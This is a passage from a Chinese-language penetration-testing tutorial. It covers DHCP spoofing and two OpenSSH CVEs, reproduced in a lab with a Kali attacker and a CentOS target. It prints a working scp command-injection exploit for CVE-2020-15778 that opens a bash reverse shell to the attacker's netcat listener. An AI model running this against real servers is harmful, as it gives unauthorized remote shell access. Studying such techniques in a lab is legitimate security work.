**67/68端口**

原理：开机时，主机会向DHCP服务器请求分配地址，这个时候，如果黑客提前把DHCP地址池的IP全部占完，并且伪装成一个新的DHCP服务器，那么主机就会向黑客的DHCP服务器请求地址，并返回一个虚假的IP和DNS地址，影响是：

1.  你打开任何网站，都会解析到黑客的钓鱼页面
    
2.  也可以嗅探到内网中明文传输的密码，例如FTP/Telnet

## 0x07 漏洞篇

**OpenSSH**  

检测方式如下：

*   先用MSF对SSH进行版本扫描，后续利用全部都是和【溢出篇-21端口】中一模一样，这里不懂的，看上文。

最新的OpenSSH分别是CVE-2020-15778（命令注入）和CVE-2021-41617（提权）：

```
资产表192.168.206.139 Centos8 SSH服务器192.168.206.140 Kali 攻击机
```

在Kail上，先用MSF对SSH进行版本扫描，我们知道了版本是8.0

*   

```

```

![](../Images/da4b68f7ef2c15de9f923c956c543c18.png)

  

发现在searchsploit找不到该版本相关漏洞，于是就去百度找最新的CVE，发现上面我们提及的两个漏洞

*   
*   

```
CVE-2020-15778影响范围： <= openssh-8.3p1CVE-2021-41617影响范围：OpenSSH版本6.2-8.7
```

  

第一个漏洞（CVE-2020-15778）是因为向远程主机拷贝文件时，用到了scp命令，而文件的路径会追加到scp命令后，scp命令没有检查过滤文件路径，导致可以插入反引号，使远程主机执行命令

（登不上SSH的时候可以用，但前提是得知道密码）

  

直接反弹SHELL

*   
*   

```
nc -lvvp 6666scp test.txt wislab@192.168.206.139:'`bash -i >& /dev/tcp/192.168.206.140/6666 0>&1`/tmp/test1.txt'
```

  

至于第二个漏洞（CVE-2021-41617）是因为/etc/ssh/sshd\_config配置不当，开启了AuthorizedKeysCommand 或 AuthorizedPrincipalsCommand（默认是不开启的），导致了执行命令时用的是sshd服务运行者的权限。

（这里大家知道就好，国内外网站都没找到相关POC，没办法复现，估计是该CVE危害影响太大了）

*   SNMP v1是SNMP协议的最初版本，不过依然是众多厂家实现SNMP的基本方式；

*   SNMP v3是最新版本的SNMP，它对网络管理最大的贡献在于其安全性，增加了对认证和密文传输的支持。
